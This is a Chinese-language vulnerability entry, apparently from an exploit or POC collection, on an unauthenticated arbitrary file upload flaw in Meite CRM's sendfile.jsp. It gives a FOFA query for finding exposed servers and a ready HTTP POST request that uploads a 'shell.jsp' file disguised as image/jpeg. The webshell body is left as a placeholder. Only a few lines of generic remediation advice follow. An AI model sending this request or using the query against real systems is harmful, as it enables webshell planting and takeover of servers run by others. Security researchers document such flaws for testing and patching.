# 美特CRM sendfile.jsp 任意文件上传漏洞

## 漏洞信息

| 属性 | 值 |
|------|-----|
| 漏洞名称 | 美特CRM sendfile.jsp 任意文件上传漏洞 |
| 漏洞类型 | 任意文件上传 |
| 组件 | 美特CRM |
| 严重程度 | 高危 |

## 漏洞概述

美特CRM sendfile.jsp 存在任意文件上传漏洞，未经身份验证的攻击者可通过构造恶意上传请求，绕过文件类型限制，将任意文件上传至服务器，进而可能实现远程代码执行或服务器控制，影响系统的完整性和安全性。

## fofa查询语句

```
body="/common/scripts/basic.js"
```

## 漏洞复现

### POC

```http
POST /business/common/importdata/sendfile.jsp HTTP/1.1
Host: target
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=yadezufhpkflwkhcidulsjikjfqpujvw

--yadezufhpkflwkhcidulsjikjfqpujvw
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: image/jpeg

<jsp代码>
--yadezufhpkflwkhcidulsjikjfqpujvw--
```

### nuclei模板

（待补充）

## 修复建议

1. 建议联系厂商打补丁或升级版本
2. 增加Web应用防火墙防护
3. 关闭互联网暴露面或接口设置访问权限
